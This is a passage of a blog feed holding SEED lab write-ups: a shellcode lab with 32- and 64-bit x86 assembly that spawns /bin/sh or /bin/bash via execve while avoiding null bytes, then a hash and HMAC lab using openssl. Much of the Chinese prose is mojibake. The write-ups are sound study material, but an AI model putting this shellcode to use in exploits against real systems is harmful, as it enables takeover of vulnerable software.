class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs asm">section .text<br>  global _start<br>    _start:<br>      ; Store the argument string on stack<br>      xor  eax, eax<br>      push eax          ; Use 0 to terminate the string<br>      push &quot;//sh&quot;<br>      push &quot;/bin&quot;<br>      mov  ebx, esp     ; Get the string address<br><br>      ; Construct the argument array argv[]<br>        push eax<br><br>        mov eax,&quot;##al&quot;<br>        shr eax,16<br>        push eax<br><br>        mov eax,&quot;ls -&quot;<br>        push eax<br>        mov  ecx,esp ;store ls -al into ecx<br><br>        xor eax,eax<br>        push eax<br>        mov eax,&quot;##-c&quot;<br>        shr eax,16<br>        push eax<br>        mov edx,esp ;store -c into edx<br><br>        xor eax,eax<br>        push eax ; 0 terminate<br>        push ecx ; ls -al<br>        push edx ; -c <br>        push ebx ; /bin/sh<br>        mov ecx,esp<br><br>      ; For environment variable <br>      xor  edx, edx     ; No env variables <br><br>      ; Invoke execve()<br>      xor  eax, eax     ; eax = 0x00000000<br>      mov   al, 0x0b    ; eax = 0x0000000b<br>      int 0x80<br><br></code></pre></td></tr></table></figure><blockquote><p>Invoking execve(â€œ/bin/shâ€, argv, 0)</p><p>â€“<strong>eax</strong> = 0x0b: execve() system call number</p><p>â€“<strong>ebx</strong> = address of the command string â€œ/bin/shâ€</p><p>â€“<strong>ecx</strong> = address of the argument array argv</p><p>â€“<strong>edx</strong> = address of environment variables (set to 0)</p></blockquote><h1 id="Task-2-Using-Code-Segment"><a href="#Task-2-Using-Code-Segment" class="headerlink" title="Task 2: Using Code Segment"></a>Task 2: Using Code Segment</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs asm">section .text<br>  global _start<br>    _start:<br>      <br>      BITS 32<br>        jmp short two<br>   <br>   one:<br>        pop ebx ; ebxå‚¨å­˜å­—ç¬¦ä¸²åœ°å€<br>        xor eax, eax ; å°†eaxç½®ä¸º0<br>        mov [ebx+7], al ;å°†alï¼Œä¹Ÿå³æ˜¯0æ›¿æ¢*<br>        mov [ebx+8], ebx  ;å°†å­—ç¬¦ä¸²çš„åœ°å€èµ‹ç»™AAAAæ‰€åœ¨çš„å†…å­˜å¤„(4 bytes)<br>        mov [ebx+12], eax ; å°†0èµ‹ç»™BBBBæ‰€åœ¨å†…å­˜å¤„<br>        lea ecx, [ebx+8] ; ecx=ebx+8ï¼Œä¹Ÿå³æ˜¯ecxå‚¨å­˜/bin/sh\0çš„åœ°å€<br>        xor edx, edx ;edxä¸º0ï¼Œè¡¨ç¤ºæ— ç¯å¢ƒå˜é‡<br>        mov al,  0x0b ;ç³»ç»Ÿè°ƒç”¨å·<br>        int 0x80<br>        <br>    two:<br>        call one<br>        db &#x27;/bin/sh*AAAABBBB&#x27; <br></code></pre></td></tr></table></figure><p>ç¨‹åºçš„å‡ ç‚¹è§£é‡Š</p><ul><li><p>è¯¦è§æ³¨é‡Š</p></li><li><p>ç¨‹åºå…ˆè·³åˆ°two</p></li><li><p>twoé€šè¿‡callæŒ‡ä»¤è°ƒç”¨oneå‡½æ•°ï¼Œè¿™æ ·çš„è¯ï¼Œä¼šå°†è¿”å›åœ°å€ï¼Œä¹Ÿå³æ˜¯<code>&#39;/bin/sh*AAAABBBB&#39; </code>å‹å…¥æ ˆä¸­ï¼Œåé¢å°±å¯ä»¥ä½¿ç”¨pop ebxå‚¨å­˜å­—ç¬¦ä¸²åœ°å€</p></li></ul><p>ä¸ºä½•å¯ä»¥è§¦å‘shellï¼š</p><ul><li>edxä¸º0ï¼Œè¡¨ç¤ºæ— ç¯å¢ƒå˜é‡</li><li>ecxå‚¨å­˜/bin/sh\0çš„åœ°å€</li><li>ebxå‚¨å­˜dbå­—ç¬¦ä¸²åœ°å€</li></ul><p><strong>æ‰§è¡Œ/usr/bin/envï¼Œå¹¶ä¸”æ‰“å°å‡ºç¯å¢ƒå˜é‡</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs asm">section .text<br>  global _start<br>    _start:<br>        BITS 32<br>        jmp short two<br>    one:<br>        pop ebx<br>        xor eax, eax<br><br>        ;the next 4 lines converse # into 0<br>        mov [ebx+12], al<br>        mov [ebx+15], al<br>        mov [ebx+20], al<br>        mov [ebx+25], al<br><br>        mov [ebx+26],ebx ;put address of &quot;/usr/bin/env\0&quot; to where AAAA is<br><br>        lea eax,[ebx+13]<br>        mov [ebx+30],eax ;put address of &quot;-i\0&quot; to where BBBB is <br><br>        lea eax,[ebx+16]<br>        mov [ebx+34],eax ;put address of &quot;a=11\0&quot; to where CCCC is<br><br>        lea eax,[ebx+21]<br>        mov [ebx+38],eax ;put address of &quot;b=22\0&quot; to where DDDD is<br><br>        xor eax,eax<br>        mov [ebx+42],eax ;0 terminate<br><br>        ; now ebx point to &quot;/usr/bin/env\0&quot;     <br><br>        lea ecx, [ebx+26] ;put address of &quot;/usr/bin/env -i a=11 b=22&quot; to ecx <br><br>        xor edx,edx ; edx = 0 <br><br>        mov al,  0x0b<br>        int 0x80<br>     two:<br>        call one<br>        db &#x27;/usr/bin/env#-i#a=11#b=22#AAAABBBBCCCCDDDDEEEE&#x27;<br>           ;012345678901234567890123456789012345678901234567890<br>           ;          1         2         3         4    <br></code></pre></td></tr></table></figure><ul><li>ä»£ç å’Œè¯¦ç»†æ³¨é‡Šè§ä¸Šé¢</li><li>â€˜/usr/bin/env#-i#a=11#b=22#AAAABBBBCCCCDDDDEEEEâ€™æ˜¯æˆ‘ä»¬æ„é€ çš„å­—ç¬¦ä¸²ï¼Œé€šè¿‡call + popæŒ‡ä»¤å¯ä»¥è·å–è¯¥åœ°å€<ul><li><code>#</code>æ˜¯å ä½ç¬¦ã€‚ä¸ºäº†é˜²æ­¢0å¯¼è‡´strcpyæ— æ³•å¤åˆ¶å­—ç¬¦ä¸²ï¼Œè¿™é‡Œä½¿ç”¨#ä½œä¸ºå ä½ç¬¦ï¼Œåé¢ä¼šç”¨alè¿›è¡Œæ›¿æ¢</li></ul></li><li><code>/usr/bin/env -i a=11 b=22</code>æ˜¯æˆ‘ä»¬è¦æ‰§è¡Œçš„å‘½ä»¤ï¼ˆä¸€å®šè¦æ³¨æ„åˆ°å­—ç¬¦ä¸²æœ€åæœ‰ä¸ª\0ï¼‰<ul><li>ecxå­˜å‚¨argvçš„åœ°å€ï¼Œå› æ­¤æŒ‡å‘ebx+26</li><li>ebxå­˜å‚¨â€œ/usr/bin/env\0â€çš„åœ°å€</li></ul></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">mysh2: mysh2.s<br>nasm -f elf32 $@.s -o $@.o<br>ld --omagic -m elf_i386 $@.o -o $@<br></code></pre></td></tr></table></figure><p>ç¼–è¯‘æ‰§è¡Œï¼Œè¿è¡Œäº†æ–°çš„shellï¼ˆomagic é€‰é¡¹ä½¿å¾—ä»£ç æ®µæ˜¯å¯å†™çš„ï¼‰</p><h1 id="Task-3-Writing-64-bit-Shellcode"><a href="#Task-3-Writing-64-bit-Shellcode" class="headerlink" title="Task 3: Writing 64-bit Shellcode"></a>Task 3: Writing 64-bit Shellcode</h1><p>æˆ‘ä»¬çš„ä»»åŠ¡æ˜¯åœ¨64ä½çš„æƒ…å†µä¸‹æ‰§è¡Œ<code>/bin/bash</code></p><p>æ³¨æ„åˆ°64ä½å’Œ32ä½çš„ä¸åŒï¼š</p><ul><li>å¯¹äº x64æ¶æ„ï¼Œè°ƒç”¨ç³»ç»Ÿè°ƒç”¨æ˜¯é€šè¿‡ syscall æŒ‡ä»¤å®Œæˆçš„</li><li>ç³»ç»Ÿè°ƒç”¨çš„å‰ä¸‰ä¸ªå‚æ•°åˆ†åˆ«å­˜å‚¨åœ¨ rdxã€ rsi å’Œ rdi å¯„å­˜å™¨ä¸­</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs asm">section .text<br>  global _start<br>    _start:<br>      ; The following code calls execve(&quot;/bin/sh&quot;, ...)<br>      xor  rdx, rdx       ; 3rd argument<br>      push rdx<br>        mov rax,&quot;h#######&quot;<br>        shl rax,56<br>        shr rax,56<br>        push rax<br>      mov rax,&#x27;/bin/bas&#x27;<br>      push rax<br>      mov rdi, rsp        ; 1st argument<br>      push rdx ; é‡ç‚¹æ˜¯è¿™ä¸¤è¡Œ<br>      push rdi <br>      mov rsi, rsp        ; 2nd argument<br>      xor  rax, rax<br>      mov al, 0x3b        ; execve()<br>      syscall<br></code></pre></td></tr></table></figure><p>å‡ ç‚¹éœ€è¦æ³¨æ„çš„ï¼š</p><ul><li>raxæ˜¯ç³»ç»Ÿè°ƒç”¨å·ï¼Œè¿™é‡Œæ‰§è¡Œexecve</li><li>rdiå‚¨å­˜<code>/bin/bash\0</code>çš„åœ°å€</li><li>rdxæ˜¯0</li></ul><p>objdumpä¸€ä¸‹ï¼Œå‘ç°ç¡®å®æ²¡æœ‰0å­—èŠ‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs asm">$ objdump -Mintel -d mysh_64<br><br>mysh_64:     file format elf64-x86-64<br><br><br>Disassembly of section .text:<br><br>0000000000401000 &lt;_start&gt;:<br>  401000:48 31 d2             xor    rdx,rdx<br>  401003:52                   push   rdx<br>  401004:48 b8 68 23 23 23 23 movabs rax,0x2323232323232368<br>  40100b:23 23 23 <br>  40100e:48 c1 e0 38          shl    rax,0x38<br>  401012:48 c1 e8 38          shr    rax,0x38<br>  401016:50                   push   rax<br>  401017:48 b8 2f 62 69 6e 2f movabs rax,0x7361622f6e69622f<br>  40101e:62 61 73 <br>  401021:50                   push   rax<br>  401022:48 89 e7             mov    rdi,rsp<br>  401025:52                   push   rdx<br>  401026:57                   push   rdi<br>  401027:48 89 e6             mov    rsi,rsp<br>  40102a:48 31 c0             xor    rax,rax<br>  40102d:b0 3b                mov    al,0x3b<br>  40102f:0f 05                syscall <br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>SEED-lab</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SEED-labï¼šOne-Way-Hash-Function-and-MAC</title>
    <link href="/p/ae23a610/"/>
    <url>/p/ae23a610/</url>
    
    <content type="html"><![CDATA[<h1 id="hashç®€ä»‹"><a href="#hashç®€ä»‹" class="headerlink" title="hashç®€ä»‹"></a>hashç®€ä»‹</h1><p>Hashå‡½æ•°ä¹Ÿå«æ‚å‡‘å‡½æ•°ã€æ•£åˆ—å‡½æ•°ã€å“ˆå¸Œå‡½æ•°ï¼Œå¯ä»¥æŠŠæ¶ˆæ¯æˆ–æ•°æ®å‹ç¼©æˆå›ºå®šé•¿åº¦çš„æ‘˜è¦</p><h2 id="æ€§è´¨"><a href="#æ€§è´¨" class="headerlink" title="æ€§è´¨"></a>æ€§è´¨</h2><ul><li>ç­‰é•¿æ€§ï¼šç»™å‡ºä»»æ„çš„è¾“å…¥ï¼Œå¾—åˆ°çš„è¾“å‡ºï¼ˆæ‘˜è¦ï¼‰é•¿åº¦ä¸å˜ã€‚æ¯”å¦‚sha-1å¾—åˆ°çš„æ‘˜è¦å›ºå®šæ˜¯160ä½ï¼Œmd5ä¸º128ä½</li><li>å•å‘æ€§ï¼šä»»ç»™xï¼Œå¾—åˆ°$y=h(x)$æ˜¯å®¹æ˜“çš„ï¼Œä»»ç»™$y=h(x)$ï¼Œå¾—åˆ°xæ˜¯å›°éš¾çš„</li><li>æŠ—å¼±ç¢°æ’æ€§ï¼šå·²çŸ¥xï¼Œæ‰¾åˆ°ä¸ä¸xç›¸ç­‰çš„yæ»¡è¶³$h(x)=h(y)$æ˜¯ä¸å¯è¡Œçš„</li><li>æŠ—å¼ºç¢°æ’æ€§ï¼šæ‰¾åˆ°ä»»æ„ä¸¤ä¸ªä¸åŒçš„è¾“å…¥$xï¼Œy$ä½¿å¾—$h(x)=h(y)$æ˜¯ä¸å¯è¡Œçš„</li></ul><h2 id="å“ˆå¸Œç¢°æ’"><a href="#å“ˆå¸Œç¢°æ’" class="headerlink" title="å“ˆå¸Œç¢°æ’"></a>å“ˆå¸Œç¢°æ’</h2><p><img src="https://img.gls.show/img/202306112258191.png"></p><ul><li>æ ¹æ®æŠ—ç¢°æ’æ€§ï¼Œä¸ä¼šæœ‰ä¸¤ä¸ªä¸åŒçš„è¾“å…¥ï¼Œä½¿å¾—å“ˆå¸Œè¿ç®—åçš„è¾“å‡ºç›¸ç­‰</li><li>å¦‚æœæ‰¾åˆ°åä¾‹ï¼Œæ¯”å¦‚ä¸Šå›¾ä¸­Johnå’ŒSandraçš„è¾“å‡ºç›¸ç­‰ï¼Œåˆ™ç§°äº§ç”Ÿäº†å“ˆå¸Œç¢°æ’</li></ul><h2 id="ç©ºé—´åˆ†æ"><a href="#ç©ºé—´åˆ†æ" class="headerlink" title="ç©ºé—´åˆ†æ"></a>ç©ºé—´åˆ†æ</h2><p>16ä¸ªäºŒè¿›åˆ¶ä½çš„å“ˆå¸Œå€¼ï¼Œäº§ç”Ÿç¢°æ’çš„å¯èƒ½æ€§æ˜¯ 65536 åˆ†ä¹‹ä¸€ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœæœ‰65537ä¸ªç”¨æˆ·ï¼Œå°±ä¸€å®šä¼šäº§ç”Ÿç¢°æ’ã€‚å“ˆå¸Œå€¼çš„é•¿åº¦æ‰©å¤§åˆ°32ä¸ªäºŒè¿›åˆ¶ä½ï¼Œç¢°æ’çš„å¯èƒ½æ€§å°±ä¼šä¸‹é™åˆ° 4,294,967,296 åˆ†ä¹‹ä¸€ã€‚</p><h2 id="ç”Ÿæ—¥æ‚–è®º"><a href="#ç”Ÿæ—¥æ‚–è®º" class="headerlink" title="ç”Ÿæ—¥æ‚–è®º"></a>ç”Ÿæ—¥æ‚–è®º</h2><p>åœ¨ä¸€ä¸ªæˆ¿é—´ä¸­ï¼Œå¦‚æœæœ‰23äººï¼Œåˆ™å­˜åœ¨ä¸¤ä¸ªäººçš„ç”Ÿæ—¥ç›¸åŒçš„æ¦‚ç‡è¦å¤§äº50%ã€‚è¿™ä¸ªâ€œæ‚–è®ºâ€å¹¶éæ˜¯é€»è¾‘ä¸­çš„æ‚–è®ºï¼Œè€Œæ˜¯ä¸ç›´è§‚æ„Ÿè§‰ç›¸æ‚–ï¼Œå› æ­¤è¢«ç§°ä¸ºç”Ÿæ—¥æ‚–è®ºã€‚å½“äººæ•°å¢åŠ æ—¶ï¼Œè¯¥æ¦‚ç‡ä¹Ÿä¼šå¢åŠ ã€‚è‹¥äººæ•°ä¸º50ï¼Œåˆ™å­˜åœ¨ä¸¤ä¸ªäººçš„ç”Ÿæ—¥ç›¸åŒçš„æ¦‚ç‡è¦å¤§äº97%ã€‚</p><p>nä¸ªäººä¸­ï¼Œæ¯ä¸ªäººçš„ç”Ÿæ—¥æ—¥æœŸéƒ½ä¸åŒçš„æ¦‚ç‡ï¼š<br>$$<br> {\bar {p}}(n)=1\cdot \left(1-{\frac {1}{365}}\right)\cdot \left(1-{\frac {2}{365}}\right)\cdots \left(1-{\frac {n-1}{365}}\right)={\frac {365}{365}}\cdot {\frac {364}{365}}\cdot {\frac {363}{365}}\cdot {\frac {362}{365}}\cdots {\frac {365-n+1}{365}}<br>$$<br>p(nï¼‰è¡¨ç¤ºnä¸ªäººä¸­è‡³å°‘2äººç”Ÿæ—¥ç›¸åŒçš„æ¦‚ç‡</p><p>$$<br> p(n)=1-{\bar {p}}(n)=1-{365! \over 365^{n}(365-n)!}<br>$$</p><h2 id="å“ˆå¸Œç¢°æ’-1"><a href="#å“ˆå¸Œç¢°æ’-1" class="headerlink" title="å“ˆå¸Œç¢°æ’"></a>å“ˆå¸Œç¢°æ’</h2><ul><li>å› æ­¤ï¼Œç”±ä¸Šå¯çŸ¥ï¼Œå¦‚æœå“ˆå¸Œå€¼çš„å–å€¼ç©ºé—´æ˜¯365ï¼Œåªè¦è®¡ç®—23ä¸ªå“ˆå¸Œå€¼ï¼Œå°±æœ‰50%çš„å¯èƒ½äº§ç”Ÿç¢°æ’</li><li>ä¸ºäº†é˜²æ­¢å“ˆå¸Œç¢°æ’ï¼Œéœ€è¦å¢å¤§å“ˆå¸Œæ˜ å°„çš„ç©ºé—´</li></ul><h1 id="lab-setup"><a href="#lab-setup" class="headerlink" title="lab setup"></a>lab setup</h1><p>é¦–å…ˆï¼Œé…ç½®å’Œå®‰è£… openssl åº“</p><p>è¿›å…¥opensslæ–‡ä»¶å¤¹ï¼Œæ‰§è¡Œmakeå‘½ä»¤</p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs vala"><span class="hljs-meta"># cd /home/seed/openssl-1.0.1</span><br><span class="hljs-meta"># make </span><br><span class="hljs-meta"># make test </span><br><span class="hljs-meta"># make install </span><br></code></pre></td></tr></table></figure><p>å®‰è£…åå…­è¿›åˆ¶ç¼–è¾‘å™¨ï¼Œä»¥ä¾¿äºæŸ¥çœ‹å’Œä¿®æ”¹äºŒè¿›åˆ¶æ ¼å¼çš„æ–‡ä»¶ã€‚é¢„åˆ¶çš„vmä¸­å·²ç»ä¸ºæˆ‘ä»¬å®‰è£…äº†GHex</p><h1 id="Task-1-Generating-Message-Digest-and-MAC"><a href="#Task-1-Generating-Message-Digest-and-MAC" class="headerlink" title="Task 1: Generating Message Digest and MAC"></a>Task 1: Generating Message Digest and MAC</h1><p>ç»™æ–‡ä»¶file.txtå†™å…¥å€¼</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">[06/11/2023 07:51] seed@ubuntu:~$ echo 1 &gt; file.txt <br>[06/11/2023 07:51] seed@ubuntu:~$ cat file.txt <br>1<br>[06/11/2023 07:52] seed@ubuntu:~$ <br><br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ä¸åŒç®—æ³•è®¡ç®—å“ˆå¸Œå€¼</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">[06/11/2023 07:52] seed@ubuntu:~$ openssl dgst -md5 file.txt <br>MD5(file.txt)= b026324c6904b2a9cb4b88d6d61c81d1<br>[06/11/2023 07:52] seed@ubuntu:~$ openssl dgst -sha1 file.txt <br>SHA1(file.txt)= e5fa44f2b31c1fb553b6021e7360d07d5d91ff5e<br>[06/11/2023 07:52] seed@ubuntu:~$ openssl dgst -sha256 file.txt <br>SHA256(file.txt)= 4355a46b19d348dc2f57c046f8ef63d4538ebb936000f3c9ee954a27460dd865<br></code></pre></td></tr></table></figure><table><thead><tr><th align="center">å“ˆå¸Œç®—æ³•</th><th align="center">æ–‡ä»¶å</th><th align="center">å“ˆå¸Œå€¼</th></tr></thead><tbody><tr><td align="center">MD5</td><td align="center">file.txt</td><td align="center">b026324c6904b2a9cb4b88d6d61c81d1</td></tr><tr><td align="center">SHA1</td><td align="center">file.txt</td><td align="center">e5fa44f2b31c1fb553b6021e7360d07d5d91ff5e</td></tr><tr><td align="center">SHA256</td><td align="center">file.txt</td><td align="center">4355a46b19d348dc2f57c046f8ef63d4538ebb936000f3c9ee954a27460dd865</td></tr></tbody></table><h1 id="Task-2-Keyed-Hash-and-HMAC"><a href="#Task-2-Keyed-Hash-and-HMAC" class="headerlink" title="Task 2: Keyed Hash and HMAC"></a>Task 2: Keyed Hash and HMAC</h1><p>ä¸ºä¸€ä¸ªæ–‡ä»¶ç”Ÿæˆä¸€ä¸ªå«æœ‰ç§˜é’¥çš„å“ˆå¸Œ(å³ MAC)å¯ä»¥ä½¿ç”¨-hmac é€‰é¡¹(è¿™ä¸ªé€‰é¡¹ç›®å‰æ²¡æœ‰æ–‡æ¡£è¯´æ˜ï¼Œä½†æ˜¯ openssl æ”¯æŒå®ƒ)</p><p>ä¸‹é¢çš„ç¤ºä¾‹ä½¿ç”¨ HMAC-MD5ç®—æ³•ä¸ºæ–‡ä»¶ç”Ÿæˆé”®æ§å“ˆå¸Œã€‚- hmac é€‰é¡¹åé¢çš„å­—ç¬¦ä¸²æ˜¯å¯†é’¥</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> openssl dgst -md5 -hmac <span class="hljs-string">&quot;abcdefg&quot;</span> filename</span><br></code></pre></td></tr></table></figure><blockquote><p>åœ¨ HMAC æˆ‘ä»¬ä¸€å®šè¦ç”¨å›ºå®šå¤§å°çš„é’¥åŒ™å—ï¼Ÿå¦‚æœæ˜¯ï¼Œå¯†é’¥å¤§å°æ˜¯å¤šå°‘ï¼Ÿå¦‚æœæ²¡æœ‰ï¼Œä¸ºä»€ä¹ˆï¼Ÿ</p></blockquote><p>å°è¯•ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">[06/11/2023 07:55] seed@ubuntu:~$ openssl dgst -hmac &#x27;aaaa&#x27; -md5 file.txt<br>HMAC-MD5(file.txt)= abc3af6de7e79bcf63c145b691486b3a<br>[06/11/2023 08:07] seed@ubuntu:~$ openssl dgst -hmac &#x27;aaaaaaaa&#x27; -md5 file.txt<br>HMAC-MD5(file.txt)= 3e6883461e3b7962e28680120799b618<br>[06/11/2023 08:07] seed@ubuntu:~$ openssl dgst -hmac &#x27;a&#x27; -md5 file.txt<br>HMAC-MD5(file.txt)= 47105645a0aafa20383f8ed98841e11d<br>[06/11/2023 08:08] seed@ubuntu:~$ openssl dgst -hmac &#x27;&#x27; -md5 file.txt<br>HMAC-MD5(file.txt)= 6f1b585dfcb5ef68c77a4dd227a6dd45<br>[06/11/2023 08:08] seed@ubuntu:~$ openssl dgst -hmac &#x27; &#x27; -md5 file.txt<br>HMAC-MD5(file.txt)= 6600036474432850121f816e2f570295<br></code></pre></td></tr></table></figure><p>è¿™è¯´æ˜ä¸æ˜¯å¿…é¡»å…·æœ‰å›ºå®šçš„å¤§å°ï¼Œå¯†é’¥é•¿åº¦å¯ä»¥æ˜¯ä»»æ„çš„</p><p>ä¸ºäº†è§£é‡Šè¿™ä¸ªç»“æœï¼Œæˆ‘ä»¬éœ€è¦æ·±å…¥ä¸€ä¸‹hmacçš„åŸç†</p><p>hmacï¼Œä¹Ÿå³æ˜¯åŸºäºå“ˆå¸Œå‡½æ•°å’Œå¯†é’¥çš„æ¶ˆæ¯è®¤è¯ç ï¼ˆHash-based Message Authentication Codeï¼‰ï¼Œå¯ä»¥ç”¨æ¥éªŒè¯æ¶ˆæ¯çš„å®Œæ•´æ€§å’ŒçœŸå®æ€§</p><p>HMACçš„è®¡ç®—è¿‡ç¨‹å¦‚ä¸‹</p><ol><li>å¦‚æœå¯†é’¥Kçš„é•¿åº¦å¤§äºå“ˆå¸Œå‡½æ•°çš„åˆ†ç»„é•¿åº¦ï¼Œå°±ç”¨å“ˆå¸Œå‡½æ•°å¯¹å¯†é’¥Kè¿›è¡Œå“ˆå¸Œè¿ç®—ï¼Œå¾—åˆ°ä¸€ä¸ªæ–°çš„å¯†é’¥Kâ€™ï¼Œå¹¶ç”¨0å¡«å……åˆ°åˆ†ç»„é•¿åº¦ã€‚</li><li>å¦‚æœå¯†é’¥Kçš„é•¿åº¦å°äºå“ˆå¸Œå‡½æ•°çš„åˆ†ç»„é•¿åº¦ï¼Œå°±ç”¨0å¡«å……åˆ°åˆ†ç»„é•¿åº¦ï¼Œå¾—åˆ°ä¸€ä¸ªæ–°çš„å¯†é’¥Kâ€™ã€‚</li><li>ç”¨å¯†é’¥Kâ€™å’Œä¸€ä¸ªå¸¸é‡ipadï¼ˆ00110110ï¼‰è¿›è¡Œå¼‚æˆ–è¿ç®—ï¼Œå¾—åˆ°ä¸€ä¸ªå†…éƒ¨å¯†é’¥Kiã€‚</li><li>ç”¨å¯†é’¥Kâ€™å’Œä¸€ä¸ªå¸¸é‡opadï¼ˆ01011100ï¼‰è¿›è¡Œå¼‚æˆ–è¿ç®—ï¼Œå¾—åˆ°ä¸€ä¸ªå¤–éƒ¨å¯†é’¥Koã€‚</li><li>ç”¨å†…éƒ¨å¯†é’¥Kiå’Œæ¶ˆæ¯Mè¿›è¡Œè¿æ¥ï¼Œç„¶åç”¨å“ˆå¸Œå‡½æ•°å¯¹è¿æ¥ç»“æœè¿›è¡Œå“ˆå¸Œè¿ç®—ï¼Œå¾—åˆ°ä¸€ä¸ªä¸­é—´ç»“æœH(Kiâˆ£M)ã€‚</li><li>ç”¨å¤–éƒ¨å¯†é’¥Koå’Œä¸­é—´ç»“æœH(Kiâˆ£M)è¿›è¡Œè¿æ¥ï¼Œç„¶åç”¨å“ˆå¸Œå‡½æ•°å¯¹è¿æ¥ç»“æœè¿›è¡Œå“ˆå¸Œè¿ç®—ï¼Œå¾—åˆ°æœ€ç»ˆçš„HMACå€¼H(Koâˆ£H(Kiâˆ£M))ã€‚</li></ol><p>HMACå¯ä»¥ä½¿ç”¨ä¸åŒçš„å“ˆå¸Œå‡½æ•°ï¼Œä¾‹å¦‚SHA-1ã€SHA-256ç­‰ï¼Œç”Ÿæˆçš„HMACå€¼çš„é•¿åº¦ä¸å“ˆå¸Œå‡½æ•°çš„è¾“å‡ºé•¿åº¦ç›¸åŒ</p><h1 id="Task-3-The-Randomness-of-One-way-Hash"><a href="#Task-3-The-Randomness-of-One-way-Hash" class="headerlink" title="Task 3: The Randomness of One-way Hash"></a>Task 3: The Randomness of One-way Hash</h1><p>ç°åœ¨æˆ‘ä»¬æœ‰ä¸€ä¸ªæ–‡ä»¶ï¼Œä½¿ç”¨ghexè§‚å¯Ÿbitä¸º<code>310A</code></p><p>å…ˆè®¡ç®—md5</p><p>ä¿®æ”¹ä¸º<code>110A</code></p><p>å†æ¬¡æ‰§è¡Œè®¡ç®—</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">[06/11/2023 08:16] root@ubuntu:/home/seed# openssl dgst -md5 file.txt <br>MD5(file.txt)= b026324c6904b2a9cb4b88d6d61c81d1<br><br>[06/11/2023 08:17] root@ubuntu:/home/seed# openssl dgst -md5 file.txt <br>MD5(file.txt)= 